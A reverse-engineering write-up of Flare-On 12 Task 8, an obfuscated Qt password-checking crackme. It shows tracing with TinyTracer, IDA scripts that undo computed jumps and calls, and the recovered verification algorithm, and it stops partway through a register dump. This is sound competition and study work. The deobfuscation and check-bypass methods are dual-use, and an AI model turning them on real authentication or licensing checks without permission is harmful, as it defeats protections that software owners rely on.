## [Flare-On 12 – Task 8](https://hshrzd.wordpress.com/2025/11/25/flare-on-12-task-8/)

Posted on [November 25, 2025](https://hshrzd.wordpress.com/2025/11/25/flare-on-12-task-8/ "4:01 am") by[hasherezade](https://hshrzd.wordpress.com/author/hshrzd/ "View all posts by hasherezade")

_In this mini-series I describe the solutions of my favorite tasks from this year’s [Flare-On competition](https://flare-on12.ctfd.io/scoreboard). To those of you who are not familiar, [Flare-On](https://flare-on.com/) is a marathon of reverse engineering. This year it ran for 4 weeks, and consisted of 9 tasks of increasing difficulty. Collection of my sourcecodes created in the process of solving can be found in my Github repository [flareon\_2025](https://github.com/hasherezade/flareon2025)._

This post covers Task 8 – _FlareAuthenticator_, which is an obfuscated Windows binary.

# Overview

Task 8 is a GUI application written in C++/Qt 6. We are instructed to launch it via a batch script that sets the path to the appropriate DLLs.

|     |     |
| --- | --- |
| 1<br>2<br>3 | `@echo off`<br>`set QT_QPA_PLATFORM_PLUGIN_PATH=%~dp0`<br>`start %~dp0\FlareAuthenticator.exe` |

For convenience, I simply added this directory to the system `PATH`.

When we run the application, we see the following window:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/flare_auth.png?w=246)

At this point, the goal of the task becomes clear: by pressing the on-screen buttons, we are supposed to enter a code that will be verified by the authenticator. If we manage to type the correct value, we will obtain the flag. Otherwise the “Wrong Password” popup shows:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/wrong_pass.png?w=290)

It is worth noticing that button “DEL” activates only when there is an input filled, and the button “OK” – only if the input is of expected size (25 characters).

# IDA

Looking inside the application in IDA, we can see that the code is obfuscated. The patterns suggest that some [OLLVM](https://github.com/obfuscator-llvm/obfuscator?tab=readme-ov-file)-style (LLVM-based) obfuscator was used.

In most functions, attempts to decompile the code do not give us the full result. Only a small fragment is decompiled, and the basic block ends with a jump whose target is calculated on-the-fly.

Below is the first attempt at decompiling the `main` function:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/t8_main_fragment.png?w=1024)

This is how the calculation of the next block looks at the assembly level:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/t8_calculated_jump.png?w=526)

Similarly, calls to other functions are obfuscated: instead of direct calls, the targets are dynamically computed at runtime.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/t9_calc_call_address.png?w=508)

On top of this, the executable is relatively large, relies on asynchronous GUI-driven actions, and calls into various Qt libraries. All of this makes the control flow very hard to follow.

## TinyTracer

In order to grasp this complexity more quickly, I decided to trace the binary’s execution. For this purpose I used my tool **[TinyTracer](https://github.com/hasherezade/tiny_tracer/)** ( [v3.2](https://github.com/hasherezade/tiny_tracer/releases/tag/3.2)). As my understanding improved, I kept tweaking its settings.

The goal at this stage was to pinpoint how the input is collected and processed, and what exact condition decides whether the code is considered correct.

### Reducing noise

The executable calls many functions from the Qt DLLs. Most of them are related to setting up the GUI and handling event loops, and are irrelevant to the main objective. A preview of [the first trace log](http://github.com/hasherezade/flareon2025/blob/main/task8/tracelogs/0_default/FlareAuthenticator.exe.tag) looks as follows:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/t8_initial_tracelog.png?w=672)

The only interesting record in this log is the one where a `QMessageBox` displaying **“Wrong Password”** is shown.

|     |     |
| --- | --- |
| 1 | `8e030;qt6widgets.?warning@QMessageBox@@SA?AW4StandardButton@1@PEAVQWidget@@AEBVQString@@1V?$QFlags@W4StandardButton@QMessageBox@@@@W421@@Z` |

The rest is dominated by cyclical GUI repaint events, which are not really of interest here.

TinyTracer allows us to reduce this noise by [setting exclusions](https://github.com/hasherezade/tiny_tracer/wiki/Exclusions-from-tracing). The latest version can filter out not only individual functions, but also entire libraries, which is especially helpful in this case, where many different APIs are called from the same Qt modules. I set the following list in `excluded.txt`:

|     |     |
| --- | --- |
| 1<br>2<br>3 | `qt6gui`<br>`qt6widgets`<br>`qt6core` |

After applying these exclusions, the trace log becomes much cleaner and easier to analyze (example [here](https://github.com/hasherezade/flareon2025/blob/main/task8/tracelogs/1_filtered/FlareAuthenticator.exe.tag)).

### Finding the input collection

While observing the trace log in real time (using **[baretail](https://www.baremetalsoft.com/baretail/)**), I noticed that each button click caused multiple calls to `memcpy` and `strlen` to be appended. I suspected that this behavior must be related to the input collection.

A relevant fragment of the trace log looks like this:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6 | `[...]`<br>`8e280;vcruntime140.memcpy`<br>`8e450;ucrtbase.strlen`<br>`8e290;vcruntime140.memmove`<br>`8e450;ucrtbase.strlen`<br>`[...]` |

TinyTracer allows us to [observe both the input and output of selected functions](https://github.com/hasherezade/tiny_tracer/wiki/Tracing-function-input-and-output). To configure which functions we want to watch, we add them to `params.txt` in the tracer’s installation directory. For this step, I filled it with the following definitions:

|     |     |
| --- | --- |
| 1<br>2 | `ucrtbase;strlen;1`<br>`vcruntime140;memmove;3` |

By default, only the input parameters are watched. If we want to watch the output as well, it can be enabled by editing [TinyTracer.ini](https://github.com/hasherezade/tiny_tracer/wiki/The-INI-file) (details on how to do it are extensively [documented on Wiki](https://github.com/hasherezade/tiny_tracer/wiki/Tracing-function-input-and-output#watching-arguments-modified-by-the-function)). Monitoring the log in real time confirms that those calls are used to copy the input content into some storage buffer.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/taking_input.png?w=749)

(Full tracelog from this session available [here](https://github.com/hasherezade/flareon2025/blob/main/task8/tracelogs/2_filtered_args/FlareAuthenticator.exe.tag)).

We can seek via IDA how those interesting APIs were referenced. It leads to two functions that IDA recognizes as `"`append\_to\_string” (`append_to_string_0`, `append_to_string1`):

[![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/memmove_reft-1.png?w=1024)](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/memmove_reft-1.png)

However, IDA can’t follow statically where exactly those functions are called. One option would be to set breakpoints on these functions in a debugger and manually inspect every hit. Instead, we can use TinyTracer to log all occurrences in a more convenient way.

### Adding local functions

While we loaded the program into IDA, and allowed for its analysis, IDA recognized by signatures some local functions: statically linked, or wrappers for the Qt functions, and automatically renamed them.

We can [export that list](https://github.com/hasherezade/ida_ifl/wiki#navigating-through-the-functions) with [IFL plugin](https://github.com/hasherezade/ida_ifl), and feed the CSV to TinyTracer, so that they will appear in the tracelog the same way as the external API calls. Exact instructions on how to do it are given on TinyTracer’s Wiki. The listing should be renamed to: “executable\_name.func.csv” (in our case: “FlareAuthenticator.exe.func.csv”).

(The resulting tracelog available [here](https://github.com/hasherezade/flareon2025/blob/main/task8/tracelogs/3_with_csv_args/FlareAuthenticator.exe.tag)).

### Finding the input fetching function

With this configuration, we can clearly see how the text of the clicked button travels through a series of Qt calls and eventually ends up in a `memmove` that appends a character to an internal buffer. The relevant part of the trace includes calls such as:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38 | `[...]`<br>`8e190;QObject::sender`<br>`8e010;QAbstractButton::text`<br>`8df90;QLineEdit::setText`<br>`8e0d0;QString::~QString`<br>`8e010;QAbstractButton::text`<br>`8e1c0;QString::toUtf8`<br>`8e0e0;QByteArray::operator char const *`<br>`8c820;append_to_string_1`<br>`8e450;strlen`<br>`8e450;ucrtbase.strlen`<br>`strlen:`<br>```Arg[0] = ptr 0x000001d295007970 -> L"1"`<br>`strlen returned:`<br>```0x0000000000000001 = 1`<br>`8e290;memmove`<br>`8e290;vcruntime140.memmove`<br>`memmove:`<br>```Arg[0] = ptr 0x0000006f7b1dfd88 -> {\x00\x00\x00\x00\x00\x00\x00\x00}`<br>```Arg[1] = ptr 0x000001d295007970 -> L"1"`<br>```Arg[2] = 0x0000000000000001 = 1`<br>`memmove changed:`<br>```Arg[0] = ptr 0x0000006f7b1dfd88 -> L"1"`<br>`memmove returned:`<br>```ptr 0x0000006f7b1dfd88 -> L"1"`<br>`8e0c0;QByteArray::~QByteArray`<br>`8e0d0;QString::~QString`<br>`8e100;QByteArray::at`<br>`8e0c0;QByteArray::~QByteArray`<br>`8e0d0;QString::~QString`<br>`8ddf0;QWidget::isEnabled`<br>`8df20;QWidget::setEnabled`<br>`[...]` |

However, IDA cannot easily determine all the locations from which these functions are called. Because the call targets are calculated on-the-fly in an obfuscated way, following cross-references only leads us to small jump stubs.

In order to pinpoint where that call is really coming from, we can use another TinyTracer’s feature: logging indirect calls (it can be set by modifying the option in TinyTracer.ini: `LOG_INDIRECT_CALLS=True`). In this case, our log will be enriched with information about all the jumps or calls using registers. In our case of interest, the part of the log that includes input collection starts with the following:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19 | `[...]`<br>`8dd30;QWidget::event`<br>`8dec0;QWidget::paintEvent`<br>`89845;[jmp rax] to: 7ff616229872 [7ff6161a0000 + 89872]`<br>`8855b;[call rax] to: 7ff6161b2e50 [7ff6161a0000 + 12e50]`<br>`8cf70;__alloca_probe`<br>`13280;[call rax] to: 7ff6161bfcd0 [7ff6161a0000 + 1fcd0]`<br>`132a8;[call rax] to: 7ff6161fdc40 [7ff6161a0000 + 5dc40]`<br>`[...]`<br>`149de;[call rax] to: 7ff61621aad0 [7ff6161a0000 + 7aad0]`<br>`14a02;[call rax] to: 7ff61622df90 [7ff6161a0000 + 8df90]`<br>`8df90;QLineEdit::setText`<br>`14a28;[call rax] to: 7ff6161d6750 [7ff6161a0000 + 36750]`<br>`14a41;[call rax] to: 7ff616224da0 [7ff6161a0000 + 84da0]`<br>`[...]`<br>`15912;[jmp rax] to: 7ff6161b5914 [7ff6161a0000 + 15914]`<br>`15a47;[call rax] to: 7ff61622c820 [7ff6161a0000 + 8c820]`<br>`8c820;append_to_string_1`<br>`[...]` |

(Full log available [here](https://raw.githubusercontent.com/hasherezade/flareon2025/refs/heads/main/task8/tracelogs/4_with_indirect_calls/FlareAuthenticator.exe.tag)).

The logged VAs are relative to the base at which our application was loaded, so to make it more convenient to read, and reproducible, we can just disable the dynamic base (PE `Optional Header` -\> `Dll Characteristics` -\> `Dll Can move`).

The first call after the paint event (`QWidget::paintEvent`) is at `0x8855b` and it leads to the function with RVA = `0x12e50`. After that, most of the logged instructions follow in a linear order. We can see calls to other functions, but they return to the addresses that are close to their call-site. At this point, we can suspect that the function collecting the input starts exactly at RVA=0x12e50.

The other way is to pinpoint it is to see the callstack under the debugger – we will use it to confirm the above observations.

First, I set the breakpoint on the offset of `QObject::sender` function (0x8e190). This function is a convenient anchor because it’s called from the Qt event handling path each time a signal handler runs.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/bp_sender.png?w=929)

Now, following `[RSP]` to see where this function was called:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/fragment_sender.png?w=624)

The function that references it is strongly obfuscated, using the patterns that were mentioned earlier. It is split into chunks, connected by jumps that are calculated on the fly. However, from the flow it seems that each jump actually leads to the next line, the function is linear. This observation can be confirmed by the last log produced by TinyTracer. Going up in the code we can view the actual start of the function, that is at RVA = `0x12E50`.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/fetch_input.png?w=949)

Repeating the same steps with the other functions from the list show that all the collected calls lead to the same function. So, at this point, we can assume that this is indeed the function fetching the input (I labeled it as `fetch_input`).

### Reaching the dispatcher

Next, we look at references to `fetch_input` in IDA. This finally brings us to a function that is not obfuscated and looks like an action dispatcher that routes GUI events to the appropriate handlers:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/to_fetch_input.png?w=464)

It is a good start, but it isn’t sufficient to fully understand what is going on inside the application.

My next step will be to connect all the relevant code blocks so that the function can be decompiled as one unit. I also want to resolve at least some of the dynamically computed calls to get a more coherent view of how the components are interconnected and to locate the final verification logic that decides whether the entered code is correct.

# Connecting the blocks

At this point we have a tracelog from TinyTracer, that logs all the indirect transitions, including calls and jumps to the calculated addresses that are part of the task’s obfuscation. We can [load them into IDA using IFL](https://github.com/hasherezade/ida_ifl/wiki#loading-outputs-from-other-tools), and, if the executable was rebased to the same base as the one where the executable was loaded during the tracing session, the VAs will be clickable.

But this is still not a satisfactory result. What I want to achieve is, to have the function that fetches the input fully decompiled, and at least partially cleaned to make the analysis easier. So, just setting labels that illustrate where the particular indirect call leads to, is not enough. I want to have the code patched in IDA, so that the decompiler can reconstruct the pseudocode.

## Recognizing the obfuscation patterns

First, I created a script that parsed my tracelog, and obtained comments identifying where the indirect branching leads to, and where the obfuscation pattern begins and ends. To save the time, I used the help of an AI to generate it, describing it the problem in details, including how the obfuscation patterns look like. It resulted in the following script:

\+ [ida\_resolve\_indirect.py](https://github.com/hasherezade/flareon2025/blob/main/task8/ida_scripts/ida_resolve_indirect.py)

The result of the script being run on the file:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/mark_calls_and_jumps.png?w=680)

As we can see, the script properly identified where the obfuscation pattern begins, and where does it lead to. Now we can make another script, that will patch out those patterns.

## Patching obfuscated jumps

I decided to make separate scripts for patching jumps and for patching calls, so that each step will be self-contained and easier to debug. Both scripts relied on the information from the comments, rather than the tag file, so the above script should be run first.

The script for patching jumps:

\+ [ida\_patch\_jumps.py](https://github.com/hasherezade/flareon2025/blob/main/task8/ida_scripts/ida_patch_jumps.py)

And the result:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/after_jumps_patched.png?w=701)

### Linearizing the .text section

After running the script, much bigger portion of the function of our interest got decompiled. However, still there were some places where although the jump target was resolved properly, the block where it lead to was not included in the decompiled code, for example:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/jumouts.png?w=792)

It was because the target was interpreted as a data:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/data_asm.png?w=742)

To avoid such issues, I created another script that just forced interpreting all content of the .text section as a linear code (in case of this executable there are no jumps mid-instruction, so it is reasonable to treat it all as linear content). The script:

\+ [ida\_force\_linear.py](https://github.com/hasherezade/flareon2025/blob/main/task8/ida_scripts/ida_force_linear.py)

Then, I applied both deobfuscating scripts again.

As a result, I’ve got much longer, and possibly complete, decompilation output of the function. You can find it [here](https://github.com/hasherezade/flareon2025/blob/main/task8/decompiled/fetch_input1.cpp).

## Patching the obfuscated calls

At this point we can see some mathematical operations, and some if/else blocks, that may possibly be the part of input processing logic. However, the view is far from being clear – there are still plenty of calls to offsets calculated on fly. To correlate our tracelog with the output, it would be good to have at least some of them resolved.

I decided to do similar patching as I did with the jumps, but this time apply them on calls, starting with simple calls with one argument, because the related assembly was easy to parse.

The script:

\+ [ida\_patch\_calls.py](https://github.com/hasherezade/flareon2025/blob/main/task8/ida_scripts/ida_patch_calls.py)

After applying the script:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/patched_calls.png?w=806)

After this operation, many calls got resolved, but the decompiled version of the function got truncated, because of the issues with interpretation where the function begins and ends. To fix this problem I just re-run the `ida_force_linear.py` script.

As a result, I’ve got the function fully decompiled, and with some interesting calls filled in. The decompiled code of this stage can be found \[ [here](https://github.com/hasherezade/flareon2025/blob/main/task8/decompiled/fetch_input2.cpp)\].

Although there is still a lot of obfuscation, we can slowly see the bigger picture emerging. For example, we can see the part of the logic that decides if the full password (that is supposed to be 25 characters long) is inserted:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/calls_res1.png?w=814)

Also, now looking at the recovered code, we can see where the logged functions that we previously saw are really referenced.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8 | `8e190;QObject::sender`<br>`8e010;QAbstractButton::text`<br>`8df90;QLineEdit::setText`<br>`8e0d0;QString::~QString`<br>`8e010;QAbstractButton::text`<br>`8e1c0;QString::toUtf8`<br>`8e0e0;QByteArray::operator char const *`<br>`[...]` |

The previously recorded offset led to the stub of the function:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/stub_only.png?w=1024)

Now we can finally see the actual references:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/show_refs.png?w=720)

Also in case of the function “append\_to\_string\_1” that we tried to locate earlier:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/append_to_str1.png?w=841)

The first argument of the call is some object variable, and the second one – a char buffer that was previously allocated. We will follow how exactly they are used later on.

# Finding the accept condition

During the initial trace, we found a call to the “Wrong Password” popup. Now, having the flow less fragmented, we can revisit it, and see where exactly it is called.

The call to the “warning” message happened at RVA = 0x8e030. Unfortunately, this function didn’t get resolved by our earlier script, because it has multiple arguments. So we will just find the caller by setting the breakpoint at the offset, and looking at the callstack. It leads to the RVA = 0x2A500:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/call_warning.png?w=1024)

Let’s look at this offset in IDA, in the decompiler view:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/wrong_pass_msd.png?w=1024)

Having now all the blocks connected, we can easily see, that the caller function is not the `fetch_input`, but `sub_1400202B0`. It was another function in the same dispatcher where the `fetch_input` was called:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/dispatcher_view.png?w=434)

Let’s call this function `check_input`.

Let’s see its decompiled code, and try to look up, what was the condition that lead to the code block including the “Wrong Password” popup to show. There is one if statement:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/checked_cond.png?w=894)

Inside the first block, that is executed if the condition was set to true, there is an unresolved jump. Keep in mind, that we resolved the jumps basing on the tracelog. That means, this part of the code was not executed during the tracing session. By flipping this flag under the debugger, we can confirm that indeed this is the final check that will lead to displaying the flag:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/t8_to_flag.png?w=459)

The condition is set to true a bit above, in the following line:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/check_cond_line.png?w=1024)

Now it is clear what is happening. Basically, some value is calculated basing on the input, and stored in the object. Then, in another function it is fetched from the object, and compared to the hardcoded value:

|     |     |
| --- | --- |
| 1 | `valid_flag = *(_QWORD *)(obj + 0x78) == 0xBC42D5779FEC401LL;// valid input result` |

## Finding out how the object was filled

Still, the code is messy, and it is hard to find out where does this object come from, and how exactly was it filled. We can grab its address at the comparison point, but it is its final state, and we need to go backwards to see how it is filled. My first thought was, that maybe Time Travel Debugging is the way to go… But then, I realized that it can be done with a very simple trick, just using VM snapshots.

1. Let’s load the exe under the x64dbg, at the beginning of the password verification. We may fill in one character of the password, just to be sure that all the global objects used for storage of states got initialized.
2. Let’s set the breakpoint at the offset where the stored result was fetched (at RVA = `0x21E29`), just before being compared with the hardcoded value
3. Time to make the VM Snapshot
4. Now, let’s fill in all the characters, and press OK. The breakpoint got hit. Time to write down the address of the object
5. Roll back the snapshot. Go to the address of the object that we previously found. Set the hardware breakpoint on the QWORD.
6. Now our breakpoint gets fired in all the lines that modify the object somehow.

Step 4:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/final_value.png?w=618)

Setting the Hardware Breakpoint on access on the noted address (0x014FE28) allowed me to note the following VAs where the buffer was accessed:

|     |     |
| --- | --- |
| 1<br>2 | `0000000140016AD4`<br>`0000000140016B04` |

Both of them are inside the function `fetch_input` :

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/ida_view.png?w=698)

We can see that the value stored at this offset changes after each character of the password is added.

The same object was also referenced in the call to `QObject::sender`:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/obj_sender.png?w=270)

As well as in `append_to_string_1`:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/append_to_str_obj1.png?w=433)

And in the length check:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/len_check.png?w=540)

Although we won’t reconstruct its full layout, we have enough information to notice that this is the main object where the input state is stored.

# Understanding the verification function

At this point we know that the calculations done on the input happen in the `fetch_input` function. The value that is calculated basing on the input, is compared to the hardcoded value `0xBC42D5779FEC401LL`:

|     |     |
| --- | --- |
| 1<br>2<br>3 | `// compare the value from the context with the correct result:`<br>`bool``is_valid =``false``;`<br>`if``(result == 0xBC42D5779FEC401LL) is_valid =``true``;` |

Most likely, it will be some equation to solve. In such cases we usually use Z3 solvers. But first we need to precisely reconstruct all the operations and the used variables.

Following the semi-deobfuscated code in IDA we can find where the object, used to store the result, is referenced. The part updating the result, at the end of the single round, can be reconstructed as:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4 | `operant_res2 = new_res + result;`<br>`operant_res3 = (~new_res | ~result + operant_res2 + 1);`<br>`result = (operant_res3 | (operant_res2 - (new_res | result)))`<br>```+ (operant_res3 & (operant_res2 - (new_res | result)));` |

There are also two references to a strongly obfuscated function at VA = `0x140081760` . This function takes two arguments – the first is our object holding the input, and the second is an index. The output is some DWORD. I denoted this function as `get_translated`. Since deobfuscating it would be tedious, I am gonna try to treat it like a blackbox.

I started by copying from the decompiled view all the lines that seem relevant for input verification. Those are the operations for a single character of input:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20 | `translated_out = ((``__int64``(__fastcall *)(QObject *,``__int64``))get_translated)(obj1, _inp_len);`<br>`v298 = *(_QWORD *)(*(_QWORD *)((``__int64``(__fastcall *)(_QWORD *))((``char``*)off_1400B6B00 + 0x7B5B49EDE4FB46BDLL))(v349) + 48LL);`<br>`v159 = (_QWORD *)((``__int64``(*)(``void``))((``char``*)off_1400C51F0 + 0x3D096B0D04F9B81ALL))();`<br>`v160 = (_QWORD *)sub_14001BEA0(*v159);`<br>`v161 = *(_QWORD *)(*(_QWORD *)sub_140079C00(*v160) + 16LL);`<br>`v162 = (~(_BYTE)v298 | ~(_BYTE)v161) + v298 + v161 + 1;`<br>`res1 = (_QWORD)_inp_len_1 << ((v162 | (unsigned``__int8``)(v298 + v161 - (v298 | v161))) + (v162 & (unsigned``__int8``)(v298 + v161 - (v298 | v161))));`<br>``<br>`v293 = (``__int64``)((``char``*)off_1400AB740 + 0x7A26A0DA498380EBLL))(*v182 + 48LL, 0);`<br>`v183 = v293 + (_DWORD)res1;`<br>`v184 = (~v293 | ~(_DWORD)res1) + v183 + 1;`<br>`res2 = v184 | (v183 - (v293 | (unsigned``int``)res1));`<br>`LOWORD(res2) = (v184 | (v183 - (v293 | (unsigned``__int16``)res1))) + (v184 & (v183 - (v293 | (unsigned``__int16``)res1)));`<br>`res3 = (``__int64``)get_translated)(obj1, res2) * translated_out;`<br>``<br>`res4 = res3 + *((_QWORD *)obj1 + 15);`<br>`res5 = (~res3 | ~*((_QWORD *)obj1 + 15)) + res4 + 1;`<br>`*((_QWORD *)obj1 + 15) = (res5 | (res4 - (res3 | *((_QWORD *)obj1 + 15)))) + (res5 & (res4 - (res3 | *((_QWORD *)obj1 + 15))));` |

There are some value in this view that are dynamically resolved, so I still don’t have the full picture. Also, I don’t yet know exactly how a single character of the input is processed.

Since the version [3.2](https://github.com/hasherezade/tiny_tracer/releases/tag/3.2), [TinyTracer allows for dumping defined disassembly ranges](https://github.com/hasherezade/tiny_tracer/wiki/Tracing-with-disassembly) (defined by file: `[app_name].disasm_range.csv`, optionally with full register context, enabled in the INI file by option: `DISASM_CTX=True`). I will use this feature to create a log registering what values were in the registers at particular steps.

During this part of the solution, I used the following TinyTracer settings:

|     |     |
| --- | --- |
| 1<br>2 | `DISASM_CTX=True`<br>`DISASM_DEPTH=1` |

Before the second call to `get_translated` some values are dynamically retrieved from the obfuscated functions, or calculated. We need to dump the arguments that were dynamically retrieved to get the better idea of how they are constructed.

They can be found in the following range (`FlareAuthenticator.exe.disasm_range.csv`):

|     |     |
| --- | --- |
| 1 | `1670A,1671E,fetch_operands1` |

After observing the fragment `fetch_operands1` across two different runs, with different inputs:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35 | `memmove changed:`<br>```Arg[0] = ptr 0x000000000014fe08 -> L"0"`<br>`[...]`<br>`1670a;[0] mov rcx, qword ptr [rbp+0x678] # disasm start: fetch_operands1`<br>```{ rcx = 0x14fdb0; }`<br>`16711;[0] mov rdx, qword ptr [rbp+0x400]`<br>```{ rdx = 0x100; }`<br>`16718;[0] mov al, byte ptr [rbp+0x3bf]`<br>```{ rax = 0x140016730; }`<br>`1671e;[0] movsx r9d, al # disasm end: fetch_operands1`<br>`[...]`<br>`memmove changed:`<br>```Arg[0] = ptr 0x000000000014fe09 -> L"1"`<br>`[...]`<br>`1670a;[0] mov rcx, qword ptr [rbp+0x678] # disasm start: fetch_operands1`<br>```{ rcx = 0x14fdb0; }`<br>`16711;[0] mov rdx, qword ptr [rbp+0x400]`<br>```{ rdx = 0x200; }`<br>`16718;[0] mov al, byte ptr [rbp+0x3bf]`<br>```{ rax = 0x140016731; }`<br>`1671e;[0] movsx r9d, al # disasm end: fetch_operands1`<br>`[...]`<br>`memmove changed:`<br>```Arg[0] = ptr 0x000000000014fe0a -> L"2"`<br>`[...]`<br>`1670a;[0] mov rcx, qword ptr [rbp+0x678] # disasm start: fetch_operands1`<br>```{ rcx = 0x14fdb0; }`<br>`16711;[0] mov rdx, qword ptr [rbp+0x400]`<br>```{ rdx = 0x300; }`<br>`16718;[0] mov al, byte ptr [rbp+0x3bf]`<br>```{ rax = 0x140016732; }`<br>`1671e;[0] movsx r9d, al # disasm end: fetch_operands1`<br>`[...]` |

We can infer that RDX holds index \* 0x100, and AL – a character of the input. Pseudocode of the second call to `get_translated`:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10 | `_WORD operand1 = 0x100 * (i + 1);`<br>`_BYTE operand2 =  inp[i];`<br>``<br>`operand_1_2_sum = operand2 + (_WORD)operand1;`<br>`operant_res1 = (~operand2 | ~(_WORD)operand1) + operand_1_2_sum + 1;`<br>`new_res = get_translated(`<br>```object1,`<br>```(operant_res1 | (unsigned``__int16``)(operand_1_2_sum - (operand2 | (unsigned``__int16``)operand1)))`<br>```+ (operant_res1 & (unsigned``__int16``)(operand_1_2_sum - (operand2 | (unsigned``__int16``)operand1))))`<br>```* prev_value;` |

Overall, the input checking loop can be summarized as ( [**t8\_algo.cpp**](https://gist.github.com/hasherezade/d18a5d418c2989411beab97e6976d0b8#file-t8_algo-cpp)):

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24 | `result = 0;`<br>`for``(``size_t``i = 0; i < 25; i++) {`<br>```prev_value = get_translated(object1, (i + 1));``//position-dependent constant (depends only on i, not on the input digit)`<br>```_WORD operand1 = 0x100 * (i + 1);`<br>```_BYTE operand2 =  inp[i];`<br>``<br>```operand_1_2_sum = operand2 + (_WORD)operand1;`<br>```operant_res1 = (~operand2 | ~(_WORD)operand1) + operand_1_2_sum + 1;`<br>```new_res = get_translated(`<br>```object1,`<br>```(operant_res1 | (unsigned``__int16``)(operand_1_2_sum - (operand2 | (unsigned``__int16``)operand1)))`<br>```+ (operant_res1 & (unsigned``__int16``)(operand_1_2_sum - (operand2 | (unsigned``__int16``)operand1))))`<br>```* prev_value;`<br>``<br>```operant_res2 = new_res + result;`<br>```operant_res3 = (~new_res | ~result + operant_res2 + 1);`<br>```result = (operant_res3 | (operant_res2 - (new_res | result)))`<br>```+ (operant_res3 & (operant_res2 - (new_res | result)));`<br>`}`<br>``<br>`// compare the value from the context with the correct result:`<br>`bool``is_valid =``false``;`<br>`if``(result == 0xBC42D5779FEC401LL) is_valid =``true``;` |

As I mentioned earlier, I will also try to treat the `get_translated` function as a blackbox, and dump its input and output.

Let’s start by dumping the context before and after the first call to get\_translated. The range that allows for it is defined as following (`FlareAuthenticator.exe.disasm_range.csv`):

|     |     |
| --- | --- |
| 1 | `15E99,15E9B,get_translated1` |

As we can conclude, comparing the first call to `get_translated` output is always predictable, because it depends only on the index of the character checked. It is easy to dump it. While dumping the context, we get the output in RAX:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4 | ```{ [rsp] -> 0xa667119fe8; rdi = 0xa66711a3e0; rsi = 0xa66711a3a0; rbp = 0xa6671194d0; rsp = 0xa667119450; rbx = 0xa667119fe8; rdx = 0x2000440400001; rcx = 0xa66711f720; rax = 0x7ff616221760; r8 = 0xa2b91db25ee5355d; r9 = 0x3db0a2bc5bcfa875; r10 = 0x8000; r11 = 0xa6671193b0; r12 = 0xa66711a0a8; r13 = 0xa667119ef8; r14 = 0xa667119ec8; r15 = 0xa66711a3c8; flags = 0x217 [ C=1 P=1 A=1 I=1 ]; }`<br>`15e99;[0] call rax # disasm start: get_translated1`<br>```{ rdx = 0x60656c99e9c3cadd; rcx = 0x0; rax = 0x279342f; r8 = 0xc53fbd32de138089; r9 = 0x3ac042cd21ec7f77; r10 = 0x4; r11 = 0xfffffffd; flags = 0x202 [ C=0 P=0 A=0 ]; }`<br>`15e9b;[0] mov rcx, qword ptr [rbp+0x678] # disasm end: get_translated1` |

The full dumped list of 25 records can be found here:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://hshrzd.wordpress.com/)

|     |     |
| --- | --- |
|  | rax = 0x279342f; |
|  | rax = 0xc678db8; |
|  | rax = 0x87d0f40; |
|  | rax = 0xcc48d40; |
